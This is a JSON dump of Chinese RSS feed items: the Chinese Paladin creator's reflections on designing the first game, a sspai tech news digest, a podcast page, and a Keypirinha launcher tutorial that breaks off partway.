[{"title":"如何评价游戏《仙剑奇侠传 1》？","date":"2021-09-01 03:51:01","description":"\n<p><b>如何评价游戏仙剑奇侠传1</b></p>\n<p><br></p>\n<p>知乎的各位朋友大家好，感谢知乎的邀请，分享我对《仙剑奇侠传1》想法。</p>\n<p><br></p>\n<p><b>《仙剑奇侠传》名字由来</b></p>\n<p>当年受到《勇者斗恶龙》和《轩辕剑二》的启发，想做一部有刻骨铭心爱情的RPG游戏成了我们的目标。于是做完《大富翁2》之后，从未做过RPG的我开始规划《仙剑奇侠传》。在当时我们的认知，RPG的和其他类型游戏最大的不同的就是带有说故事。起初，受到环珠楼主《蜀山剑侠》的影响，加上也喜欢金庸大师的武侠小说，所以最初构思的故事有仙侠也有武侠。加上我也喜欢读历史，尤其从安史之乱前后唐朝从极盛走向乱世这段历史，所以最初就选择“安史之乱”做为剧情的时代背景，讲述一个少年侠客在这乱世中的成长故事。当时的我们想呈现一个有武侠、有玄幻、有历史、有爱情、有聊斋的故事。呵呵，现在想起来那时候太贪心了，于是第一年写的剧情越写越收不住，后来几乎全作废，第二年推倒重来。</p>\n<p><br></p>\n<p>自小因为背诗而喜欢上李白和杜甫，所以常希望着游戏中他们能登场。两人都是盛唐时期的大诗人，但因经历不同、诗风迥异：描写悲情的时候需要杜甫，写一个逍遥侠客的时候需要李白。我尤其向往李白描述的侠客精神，那首《侠客行》是真的代表了中国“侠”的境界。</p>\n<p><br></p>\n<p>……十步杀一人，千里不留行。事了拂衣去，深藏身与名。</p>\n<p><br></p>\n<p>本来想以这首诗的名字来命名这个游戏，但这名字金庸大师已经用了，所以最初加上前缀为《逍遥侠客行》。因为故事中的主人公，那个年少侠客的名字就叫李逍遥——是的，这就是李逍遥名字的由来，他之所以姓李就是因为我喜欢李白，名为“逍遥”则是这个人物的性格，少年侠客嘛，就是要自由不羁，逍遥快活的。但是后来随着剧本的大改，越来越觉得《逍遥侠客行》的名字不完全适合，后来重新想新名字《仙剑奇侠传》，同时兼具仙与侠的元素，而且有种潇洒不羁感。</p>\n<p><br></p>\n<p><b>女娲传说</b></p>\n<p>在决定必须带有玄幻、神话的成分之后，选择哪位神仙成为游戏中的核心元素呢？我想要一位不带宗教色彩的、有发挥空间、形象正面的女神。找了一些资料后，最终进入我们视线的只剩下女娲娘娘。我个人非常喜欢女娲的传说，但是除了补天和造人以外，其他的素材并不多，反而让我们有不小的发挥空间。</p>\n<p><br></p>\n<p><b>李逍遥</b></p>\n<p>在男主角的设定上，我们想用李逍遥这样一个凡人小伙子的起点，从而与后来的玄幻情节形成了巨大的起伏效果。这个生于市井、长于江湖，命犯桃花的 “坏小子”形象下，有着一颗朴实、仗义、和责任感的心。这种外表和内心的反差，是他的人物魅力所在。结果证明，李逍遥那出身平凡却不甘于平凡的形象获得了许多人的共鸣，我想是因为现实世界的你我内心也大多是这样的。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-e4784523aa97677c902ff005789b6561_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"835\" data-rawheight=\"1173\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><b>赵灵儿</b></p>\n<p>要成为李逍遥和大家心目中的“仙女”，绝对不能是寻常人物，无论是容貌、个性、背景都要非常特别，甚至背负很大的使命才能创造剧情效果。所以，灵儿她有了一个不同凡响的身世——女娲族的后裔；赵灵儿在和李逍遥相遇之后，不仅成为推动游戏主线的灵魂人物之一，开始跟李逍遥演绎了一见钟情式的牛郎织女式的浪漫奇遇，更成为了整个冒险故事的开场。</p>\n<p><br></p>\n<p>赵灵儿的气质如莲花不染纤尘，她需要保护疼惜，她无条件的信任和依赖李逍遥；这就是灵儿，内心只是一个单纯的女孩，渴望着属于自己简单的幸福，“逍遥哥哥陪我去街上逛一逛”就足够满足。但是她面对自己宿命和使命的时候，又显得那么是执着和倔强的。她就像是传统女性的代表，也是男性梦想中完美女性的化身的代表。而她以完美的形象出现在剧情里，以无比遗憾的结局香消玉殒，从某种意义上讲，这个角色就是用来营造“完美与缺憾”的冲突感的，赵灵儿用自己的一声叹息诠释了因为这个世界就是不完美的真谛。</p>\n<p><br></p>\n<p>赵灵儿的原型部分来自我大专时一位邻桌女同学，是当时全班仅有的四位女同学，是班上许多理工男单方面远远欣赏的班花，包括我。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-4e9fb730a7991e74c0168ab54f5ca152_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"835\" data-rawheight=\"1173\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><b>林月如</b></p>\n<p>林月如，一个现实世界的刁蛮的千金小姐。她拥有一身武艺，她独立而又、她痴情，在机缘巧合之下毅然决然地放弃一切、义无反顾的追随李逍遥。林月如最伟大的地方，其实是甘愿做李逍遥寻找灵儿漫长旅途中相互扶持的知己，不计回报甚至甘愿为自己爱的人付出生命。</p>\n<p>林月如也是完美的，相比赵灵儿；林月如美的更真实的。她的爱，是一种最纯粹的付出。</p>\n<p><br></p>\n<p>林月如的原型部分来自当时一位女同事，是当时极为阳盛阴衰的研发部中仅有的女生之一。网上流传仙剑悲剧式剧情是因为我当时失恋而写的，我必须再次澄清，现实世界里我并没有在制作《仙剑1》过程中失恋——只是第二次单方面……因为压根没人跟我这位宅男恋过，所以不能算失恋。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-1be2082955b7518741122a33ad15b32a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"835\" data-rawheight=\"1173\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><b>阿奴</b></p>\n<p>阿奴这个角色在女一、女二号比较明确之后，女三号一直没想好，但是固执的我一直想要有一个苗族少女，只因为我蛮喜欢苗族元素，所以想要有一个苗族少女在游戏里，于是后来就有了阿奴，。刁钻伶俐得连令李逍遥都颇感无可奈何的妹妹类型的角色，而关键时刻却又挺身而出的阿奴，也是我很喜欢的人物。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-6fc099e90faed35bc300d6f5f7e4e1a3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"835\" data-rawheight=\"1173\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><br></p>\n<p><b>结局设计</b></p>\n<p>因为游戏开发到第二年是在废弃了原大纲，未确定后面剧情发展下直接做一张地图写一章对白的很不正规方式推进，所以我们当时对白写到锁妖塔剧情结尾时，大家都还不知道如何解释之前立下的”入锁妖塔从无人生还“的flag，于是必然要有人牺牲才合理。谁会死？当时内部争议很大，我做出锁妖塔结局林月如牺牲的主张，策划极力反对，项目组里绝大部分人也不支持，当时游戏没有这种先例！但是基于塑造人物高光时刻的需要，我很坚持，于是谁都说服不了谁，这种争论持续了很久，甚至有人说为何不安排南海神尼把林月如带走。我的主张这在当时看起来是冒很大风险的，以前从没有游戏这么做的！如果把玩家喜欢的人物给写死了，喜欢这人物的玩家会恨你一辈子……</p>\n<p><br></p>\n<p>但是我们也很想做出一个跟过去不一样的故事，这很矛盾。这时，林坤信用《飞狐外传》的结局给了我建议和信心，《飞狐外传》它是一个没有结局的结局，小说里男主角跟女主角的爸爸的一个决战……林坤信说这手法留悬念，这是金庸所有的小说当中结局跟其他作品最不一样的。我仔细研究《飞狐外传》后，心里更笃定了。接下来，我还是强硬坚持把锁妖塔结局巨石落下的剧情动画安排制作，但又安排圣姑三十六只傀儡虫的暗示情节。</p>\n<p><br></p>\n<p>后来写到大结局的时候，大家一听说赵灵儿也被我安排英勇牺牲了，大家愤怒的眼神让我觉得真正该死的人其实是我……但最终结果验证，这样的结局虽然伤感，但是让人念念不忘……</p>\n<p><br></p>\n<p>对于仙剑1的结局，我是这么看的：你看到的结尾像是像悲剧，但是它隐含一份补偿的希望也伴随其中；人生总有得也有失，命运是无情的也是公平的，当命运关上一扇门，也会打开另一扇们，只是需要我们懂得珍惜。</p>\n<p><br></p>\n<p><b>仙音</b></p>\n<p>《仙剑》里只有音乐我没有参与制作的，因为我不会，幸好我们请到一位天才音乐师——林坤信，被许多玩家奉为经典的《蝶恋》的MIDI原曲便是出自他手。当时他还不是大宇内部的员工，而是承包《仙剑》音乐的独立音乐师，他常常来和我们讨论，包括剧情，以便让音乐更好的贴合游戏。他不是那种纯粹只制作音乐，也对编剧很有想法，他的意见很有帮助，毕竟我们的剧情理念颇为相融，常常能碰撞出一些火花。有时候我们在想某段剧情，他会提出他的建议和想法，包括剧情最后结局采取留白手法就是他提的建议。</p>\n<p><br></p>\n<p><b>意外之悲喜</b></p>\n<p>让我想不到的事情是，不久之后竟然由于《仙剑》影响力，我得以找到了父亲失散数十年的亲人。</p>\n<p><br></p>\n<p>那是2002年的某一天，我收到了一个玩家的来信，信的内容令我无比震惊…… 他来信并不是像其他玩家那样来倾诉他们对《仙剑》的意见，而是在来信中提出了一个他对我个人身世的推测。</p>\n<p><br></p>\n<p>原来他接触仙剑时，注意到我的名字叫姚壮宪，和他舅舅们的名字都只差末尾一个字，都叫姚壮什么的，而他母亲家族中同辈兄弟的名字中的“壮”是根据家族谱而来的“壮”字辈，他们老家在江苏省连云港东海县。</p>\n<p><br></p>\n<p>这是一种巧合么？可能我是他亲戚？他听长辈们说过，有一位舅公1949年时去了台湾省，从此渺无音讯。于是他写来一封信，把他的猜测写在了信里头。我立刻给我妈打电话求证，随后按照来信留的联系方式和那边的亲戚联系上。</p>\n<p><br></p>\n<p>不久我赶赴连云港，得知我爸爸的四弟仍健在，也就是我的四叔，和我四婶和堂哥堂嫂一家在连云港市区定居，还有很多亲戚在东海县老家，跟我同辈份叫姚壮什么的很多，但年纪都比我大许多，原因是我爸年纪很大才结婚生子，所以我是同辈中最年纪小的。这些年他们也曾打听我们的下落，但是小时候我父亲走的早，加上那几年频繁的搬家，和父亲在台仅有的亲戚朋友都失联了。</p>\n<p><br></p>\n<p>认祖归宗当然欣慰，不过有遗憾，我们是在2002年联系上的，当时我奶奶二个月前刚过世。四叔很难过，他对我说，奶奶期盼了一辈子，如果再早两个月，就可以知道失散几十年儿子的下落，和看到孙子认祖归宗……</p>\n<p><br></p>\n<p><b>我心中的《仙剑》</b></p>\n<p>《仙剑》从来不是任何一个人的，而且没有任何一个人能独自代表这个系列。《仙剑》的今天是很多人的心血聚集而来的。《仙剑》里面有很多不同亮点，这些亮点就是多人智慧发酵的结果。对于《仙剑》来说如果想要做得更好，就必须让更多有能力的人参与进来，不断有新鲜的血液融入，才能持续升华。我相信有传承也有创新，《仙剑》生命力才能更长久。</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yao-xian-37-48?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">姚仙</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/456525633/answer/2096523881?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">22 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/31467553?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么那么多人黑《仙剑奇侠传》这个游戏？</a><br><a href=\"http://www.zhihu.com/question/31190018?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价仙剑奇侠传六中出现的各种其他游戏的元素？</a><br>\n","link":"http://www.zhihu.com/question/456525633/answer/2096523881?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"派早报：腾讯放弃音乐版权独家授权权利、微软宣布 Windows 11 正式版发布日期","date":"2021-09-01 00:51:05","description":"\n<h2><strong>你可能错过的新鲜事</strong></h2>\n<h3>腾讯正式宣布放弃音乐版权独家授权权利</h3>\n<p>继国家市场监督管理局于 2021 年 7 月 24 日发布《腾讯控股有限公司收购中国音乐集团股权违法实施经营者集中案行政处罚决定书》后，腾讯于 8 月 31 日正式宣布，截至 2021 年 8 月 23 日，已经解除了绝大多数的独家协议，针对尚未按期解约的上有版权方已经明确放弃独家授权的权力，并告知版权方可以自行和其他经营者进行授权，同时腾讯也表示未来和上游版权方合作将以非独家的形式进行，共同推动音乐产业的繁荣和创新。<a href=\"https://mp.weixin.qq.com/s/uaWiBrlI38iOL4j69FEWRw\" target=\"_blank\">来源</a></p>\n<h3>微软宣布将于 10 月 5 日正式发布 Windows 11</h3>\n<p>微软于 8 月 31 日正式宣布，将会在 2021 年 10 月 5 日正式推出 Windows 11，该系统将会为符合条件的 Windows 10 电脑提供免费升级，或者将伴随着新硬件同步发售，当前的系统用户可以通过检查工具以及 Windows Update 进行检查看是否可以获得升级。<a href=\"https://www.theverge.com/2021/8/31/22649940/windows-11-release-date-features-devices-free-upgrade\" target=\"_blank\">来源</a></p>\n<h3>三星宣布将会从 9 月开始测试基于 Android 12 的 One UI 4</h3>\n<p>三星于 8 月 31 日在其社区论坛中正式宣布，基于 Android 12 的 One UI 4 的测试版将从本月正式开启测试，可以参与测试的机型包括 Galaxy S21/S21+/S21 Ultra 等机型，目前尚不清楚是否会像 Google 那样大量采用 Material You 设计元素。<a href=\"https://9to5google.com/2021/08/31/samsung-android-12-teaser-beta-date/\" target=\"_blank\">来源</a></p>\n<h3>Windows 11 首个正式版将不包含对 Android App 的支持</h3>\n<p>8 月 31 日，微软 Windows 市场总监 Aaron Woodman 在接受采访时表示，将持续与英特尔以及亚马逊合作，把 Android App 引入 Windows 11 以及 Microsoft Store 中，并在未来几个月的 Insider 版本中进行测试。这意味着 10 月 5 日即将发布 Windows 11 首个正式版将不包含对 Android App 的支持，具体日程或将推移至 2022 年。<a href=\"https://www.theverge.com/2021/8/31/22650000/microsoft-windows-11-android-apps-support\" target=\"_blank\">来源</a></p>\n<h3>Magisk 作者公布 App 未来维护计划</h3>\n<p>近日，Magisk 的开发者 John Wu 在博客发布软件未来维护计划，宣称将持续维护和开发 Magisk，但因工作性质原因，将会停止对 MagiskHide 的开发工作，其次 Magisk-Module-Repo 将从 Magisk 应用程序中移除，并转移到 Github 由其他人员进行管理。<a href=\"https://www.xda-developers.com/magisk-development-continues-without-magiskhide/amp/?__twitter_impression=true\" target=\"_blank\">来源</a></p>\n<h2><strong>看看就行的小道消息</strong></h2>\n<ul><li>据外媒消息报道，Google 即将发布的 Pixel 6 或将配备最高 23W 无线充电技术。<a href=\"https://www.androidpolice.com/2021/08/31/exclusive-googles-new-pixel-stand-for-the-pixel-6-should-support-23w-fast-wireless-charging/\" target=\"_blank\">来源</a>\n</li></ul>\n<h2><strong>少数派的近期动态</strong></h2>\n<ul>\n<li>✒️️ Android 平台优质写作工具「纯纯写作」开学季促销，欢迎前往 <a href=\"https://sspai.com/item/13\" target=\"_blank\">少数派正版软件商城</a> 下单。</li>\n<li>🧸 少数派会员通讯《<a href=\"https://sspai.com/prime/precog/vol06-pre-toys-for-adults\" target=\"_blank\">大人的玩具</a>》已经上线，来看看乐高与模型的故事，祝你玩得开心。</li>\n<li>📕 由少数派编辑部联合优秀作者出版的实体书《数字时代的效率手册》上线电商平台，<strong>少数派预购会员将获赠该书</strong>。<a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单 &gt;</a>\n</li>\n<li>📡 你会在日常生活中使用 5G 网络吗？去 <a href=\"https://sspai.com/bullet/1628500218\" target=\"_blank\">一派</a> 和大家聊聊。</li>\n</ul>\n<h2><strong>你可能错过的文章</strong></h2>\n<ul>\n<li><a href=\"https://sspai.com/post/68404\" target=\"_blank\">把你的想法画出来：用 AI 一键进行「无中生有」的创作</a></li>\n<li><a href=\"https://sspai.com/post/68500\" target=\"_blank\">国物馆 | 中国咖啡看云南，这是我们自己的「咖啡王国」</a></li>\n<li><a href=\"https://sspai.com/post/68331\" target=\"_blank\">开学季 | 想多读点书没那么难，你可以从这些地方入手</a></li>\n<li><a href=\"https://sspai.com/post/68546\" target=\"_blank\">App+1 | 小巧身板也能称心如意，可以 DIY 的 Windows 启动器：Keypirinha</a></li>\n<li><a href=\"https://sspai.com/post/68543\" target=\"_blank\">一派·再读 06：七夕节过去了，听完这期它又会回来</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68561"},{"title":"一派·再读 06：七夕节过去了，听完这期它又会回来","date":"2021-08-31 09:58:43","description":"\n<p>注：本期节目录制过程中出现了技术故障，导致一部分音频的质量不佳，收听时请多包涵。</p>\n<hr>\n<p>在数字时代之前，冲印相片、互传信件是记录爱意的方式。当这些物件在数字时代走进历史时，我们又该用什么工具、用怎样的方式来传递人与人之间的温情呢？或许不用太过怀念过去的老办法，用新时代的设备，也能帮我们表达自己的心意。</p>\n<p>第六期再读播客，我们请到《<a href=\"https://sspai.com/post/66935\">iOS 的感情升温小技巧：拉近你和家人、恋人、朋友之间的关系</a>》 一文的作者 <a href=\"https://sspai.com/u/tpamazing/updates\">@Tp</a> 和 <a href=\"https://sspai.com/u/379wzx2e/updates\">@桌沿奇思</a>，以及 <a href=\"https://sspai.com/u/9gowv081\">@重新想象Lab</a> （微信公众号：rei-lab）专栏主理人 Shooca，和我们一起聊聊那些让我们与家人、朋友们感情升温的故事与技巧。</p>\n<p>「再读」是由少数派数字工具组出品的「读书会式」播客，以少数派发布的文章为线索，以播客的形式对文章中所讨论的话题和内容，进行延展和反思，以拓宽文章所涉及的范围。</p>\n<p>如果您喜爱再读播客，并希望它持续更新，请在各平台留下您的评论，以表达对我们的支持。您的支持将是我们继续制作的重要动力。</p>\n<h2>🎧 直接收听</h2>\n<div class=\"ss-audioSource\" src=\"https://v.typlog.com/reread/8369665908_816216.mp3\" title=\"七夕节过去了，听完这期它又会回来\" cover=\"https://cdn.sspai.com/2021/07/07/fe004448674fcfbacfb30c53e670a0e3.jpg\" artist=\"再读\" chapter='[\n{\"name\":\"我们与数字设备，有点故事\",\"time\":355},\n{\"name\":\"最不能错过的感情升温技巧\",\"time\":668},\n{\"name\":\"坐在一起看照片，还是最难忘的回忆\",\"time\":1386},\n{\"name\":\"文字，能传情\",\"time\":1861},\n{\"name\":\"或许设备不是感情升温的关键\",\"time\":2294}\n]'>Audio</div>\n<h2>📻 订阅节目</h2>\n<p>我们推荐你使用 RSS 链接来订阅节目，以获得最佳收听体验。如果你不了解 RSS 订阅节目的方法，请参考 <a href=\"https://sspai.com/post/57960\">这篇文章</a> 中的指导。</p>\n<ul>\n<li><a href=\"https://reread.typlog.io/episodes/feed.xml\">RSS 地址</a></li>\n<li><a href=\"https://podcasts.apple.com/cn/podcast/id1510716121\">Apple 播客</a></li>\n<li><a href=\"https://www.xiaoyuzhoufm.com/podcast/60405cf8efb6db2a3facf71a\">小宇宙</a></li>\n<li><a href=\"https://open.spotify.com/show/6JCKn9NzBH1N19CpNLMgUz\">Spotify</a></li>\n</ul>\n<h2>📮 反馈请致</h2>\n<ul>\n<li>主播邮箱： sainho@sspai.com</li>\n<li>少数派主页：<a href=\"https://sspai.com/u/es8osc9d/updates\">数字工具组</a>\n</li>\n</ul>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68543"},{"title":"App+1 | 小巧身板也能称心如意，可以 DIY 的 Windows 启动器：Keypirinha","date":"2021-08-31 09:30:00","description":"\n<p>丑话说在前头，作为一款启动器，Keypirinha 有一定的使用门槛：软件无中文界面，所有配置均需要在文本编辑器中完成。但在花了一些时间通读 <a href=\"https://keypirinha.com/\" target=\"_blank\">官方文档</a> 并仔细配置后，它却成为了为数不多的、陪伴我三年以上的数字工具。</p>\n<p>所以我打算向你推荐它。</p>\n<p>Keypirinha 的名字来自 Keyboard 和 Caipirinha（一种鸡尾酒），开发者称其专为 Keyboard ninjas 打造。和同类工具 <a href=\"https://sspai.com/post/33460\" target=\"_blank\">Wox</a>、<a href=\"https://sspai.com/post/52725\" target=\"_blank\">Listary</a> 等工具一样，它的作用是使用全局快捷键调出搜索框，然后快速打开 App、网址、进行本地或网络搜索、键入关键词调用扩展功能……</p>\n<p>不一样的是，Keypirinha 由 C++ 打造，占用内存极小（20 MB），运行稳定，从皮肤到各类功能都支持自定义。如果你正在寻找一款稳定、轻便、可定制的启动器，并且愿意花上一段时间将它调教成顺手的样子，那么颇具极客风的 Keypirinha 或许能够让你满意。</p>\n<h2>安装与基础配置</h2>\n<p>如果读者装有 <a href=\"https://chocolatey.org/install\" target=\"_blank\">Chocolatey</a> 的话，那么可以使用管理员权限运行终端，键入 <code>cinst Keypirinha -y</code> 来自动安装此软件；或者我们也可以到 <a href=\"https://keypirinha.com/download.html\" target=\"_blank\">官网</a> 或 <a href=\"https://github.com/Keypirinha/Keypirinha/releases\" target=\"_blank\">GitHub</a> 页面下载对应电脑版本的 7z 压缩包，解压后点击 <code>keypirinha.exe</code> 即可部署并启动主程序。</p>\n<p>使用 Chocolatey 安装的话，该软件在 <code>ProgramData\\chocolatey\\lib</code> 文件夹中，我们需要进入此文件夹自行启动，Keypirinha 会像正常软件一样在用户目录下生成配置文件；下载压缩包安装的话，Keypirinha 则会默认以绿色模式运行，配置文件在同目录的 <code>portable</code> 文件夹中。</p>\n<p>这两种模式的区别仅仅在于配置文件的位置不同，后者可以放在 U 盘中方便迁移。控制两种模式的方法是在主程序同目录删除/新建 <code>portable</code> 文件夹，程序会在每次启动时检查是否有此文件夹，如果有则采用绿色模式。</p>\n<p>程序启动后，我们能在通知栏中看到 K 字图标，右键此图标，即可看到程序所有的设置入口。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mocn5b34tcuopj7tkg.png\"></figure><p><strong>我们先点击 Configure Keypirinha 进行一些基础的配置</strong>。</p>\n<p>选择此项后，会弹出左右两个文本编辑器窗口，左侧是英文的配置文档，右侧窗口供用户键入。这种双窗口与编辑文本的配置方式适用于 Keypirinha 本体和所有的扩展。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/31/b7e351b7ce135b8f3c23654cb0c48d3a.png\"><figcaption>新安装的程序右侧编辑器应该是空的</figcaption></figure><p>在准备长期使用之前，一定要配置的是快捷键、开机自启、失去焦点隐藏窗口、保持置顶四项。参考左侧文档，键入以下内容；然后保存文档，配置立即生效。</p>\n<pre class=\"language-yaml\"><code>[app]\nlaunch_at_startup = yes\n# 我设置的快捷键是 Alt + 空格\nhotkey_run = Alt + Space\n\n[gui]\nhide_on_focus_lost = yes\nalways_on_top = yes\n</code></pre>\n<h2>基本操作方法</h2>\n<p>经过上述配置，现在我们可以使用设定好的快捷键呼出一个居中的搜索栏，这就是 Keypirinha 本体了：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mocntb34tcuopj7tl0.png\"></figure><p>键入想要搜索的 App 名称、方向键选择条目，再按下 <code>Enter</code> 即可打开；选中条目后，按 <code>Tab</code> 则会出现更多相关选项。不想使用方向键的话，<code>Ctrl + 数字键</code> 也可以快速执行相关条目的操作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4moco5b34tcvciqac1g.gif\"></figure><p>我们也并不需要完整输入 App 或条目的名称，只要是名称中的关键字母即可。比如 Firefox 可以使用 <code>ff</code> 来呼出。值得一提的是，如果你对某关键字的首选匹配不满意，选择打开了其他条目，软件会记忆此行为，并对匹配结果进行动态调整。</p>\n<p>软件目前不支持使用拼音检索中文软件，亦不支持为条目设置与命名无关的别名。变通的方法也有：在开始目录为一个程序创建其他名称的快捷方式，例如为 Chrome 创建 <code>chrome.lnk</code> 和 <code>谷歌浏览器.lnk</code> 两个快捷方式。不能被 Windows Search 发现的绿色软件也可以如此操作来保证可以被正常检索。</p>\n<h2>如何定制外观</h2>\n<p>读者可能发现以上的截图中，笔者展示的软件外观和程序默认的不同。这是因为 Keypirinha 可以自定义主题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mocodb34tcvciqac20.jpeg\"><figcaption>图：背景来自微软官方，前景来自 Keypirinha 官网</figcaption></figure><p>Keypirinha 默认提供了 10 余款主题，你可以在此 <a href=\"https://keypirinha.com/theming.html\" target=\"_blank\">网站</a> 预览这些皮肤的效果。改变主题需要选择 Configure Keypirinha，然后更改 <code>[gui]</code> 下的 <code>theme = </code> 选项为其他名称。</p>\n<p>笔者展示的样式是自己修改而来的。自己创建主题的方法是在 Keypirinha 设置文件的末尾，以 <code>[theme\\主题名称]</code> 开头，参考给出的主题文档，定义各个组成部分的字体、颜色的数值。再修改 <code>theme</code> 的值为 <code>主题名称</code>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mocolb34tcuopj7tlg.jpeg\"></figure><p>如果你觉得手动写参数比较繁琐，也有热心用户创建了图形化、可预览的主题自定义网站，访问 <a href=\"https://ricardof.dev/keypirinha-theme-builder/\" target=\"_blank\">Keypirinha Theme Builder</a> 即可使用。在网站中修改右侧各个条目的值，完成后点击 <code>Download theme</code> 按钮并将生成的文本复制进软件设置即可。此网站同样也提供了近百个第三方主题供访客下载或修改。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mocolb34tcvt9nu8bg.png\"></figure><h2>扩展的安装和推荐</h2>\n<p>当然，仅仅能搜索 App 未免太过简单，我们还可以通过 Keypirinha 的扩展实现计算器、翻译、搜索浏览器书签、搜索 Emoji 等一系列功能。</p>\n<p>Keypirinha 预装了 Google 翻译、Putty 等扩展，如果你想禁用这些第一方扩展，可以在程序设置文件的 <code>[app]</code> 块下添加 <code>ignored_packages = 扩展名,扩展名2</code>；除官方扩展外，<a href=\"https://keypirinha.com/contributions.html\" target=\"_blank\">此网址</a> 还列出了大部分第三方扩展，它们的安装也比较简单：在通知栏 K 字图标 <code>右键 &gt; Browse Profile Dir</code>，其中有一个 <code>InstalledPackages</code> 文件夹，将下载下来的 <code>.keypirinha-package</code> 后缀名的文件放入此文件夹即可。</p>\n<p>扩展大致有两种工作方式：<strong>其一是对默认搜索的增强</strong>，如 Bookmarks 扩展会给检索数据库增加来自 Chrome 和 Firefox 的书签，用户只需要输入书签名便会返回相应的结果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mocotb34tcvciqac2g.png\"></figure><p><strong>其二是设定关键词触发</strong>。扩展会定义一个独特的关键词，输入此关键词后，按 <code>Tab</code> 就能使用扩展的功能，例如官方的 WebSearch 扩展可以让用户使用关键词来进行网络搜索。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mocpdb34tcvt9nu8c0.gif\"></figure><p>扩展和 Keypirinha 本体一样也有自己的配置文件，我们可以在图标右键的 <code>Configure Package</code> 菜单的子项中找到配置文件的入口。下面就以扩展 Everything 为例，展示具体的修改方法：</p>\n<p>在 <code>Configure Package</code> 子项选择 <code>everything</code> 以打开扩展的配置文件，同样会弹出左侧文档，右侧配置文件的布局。参考文档说明，例如笔者想修改此扩展的触发关键词为 `（反引号），只需要输入下列内容，保存文本即可生效。</p>\n<pre class=\"language-c#\"><code>[main]\nitem_label_format = `: {search_name}\n</code></pre>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mocplb34tcvt9nu8cg.gif\"></figure><p>除了预装的扩展外，笔者认为下列第三方扩展也值得一试：</p>\n<ul>\n<li>\n<a href=\"https://github.com/ueffel/Keypirinha-WindowsApps\" target=\"_blank\">WindowsApps</a>：必装扩展，用以搜索从 Windows Store 安装的软件。</li>\n<li>\n<a href=\"https://github.com/AvatarHurden/keypirinha-currency\" target=\"_blank\">Currency</a>：货币转换。</li>\n<li>\n<a href=\"https://github.com/ueffel/Keypirinha-Time\" target=\"_blank\">Time</a>：以各种格式输出时间。</li>\n<li>\n<a href=\"https://github.com/Fuhrmann/keypirinha-gitmoji\" target=\"_blank\">Gitmoji</a>：搜索用于 GitHub 的 Emoji。</li>\n<li>\n<a href=\"https://github.com/andriykrefer/keypirinha-emojii\" target=\"_blank\">Emojii</a>：搜索 Emoji🎧 并复制。</li>\n<li>\n<a href=\"https://github.com/Fuhrmann/keypirinha-sharex\" target=\"_blank\">ShareX</a>：执行 ShareX 各种动作。</li>\n<li>\n<a href=\"https://github.com/EhsanKia/keypirinha-plugins/tree/master/keypirinha-steam\" target=\"_blank\">Steam</a>：搜索 Steam 游戏。</li>\n</ul>\n<p>开发者亦开放了相关的 <a href=\"https://keypirinha.com/api.html\" 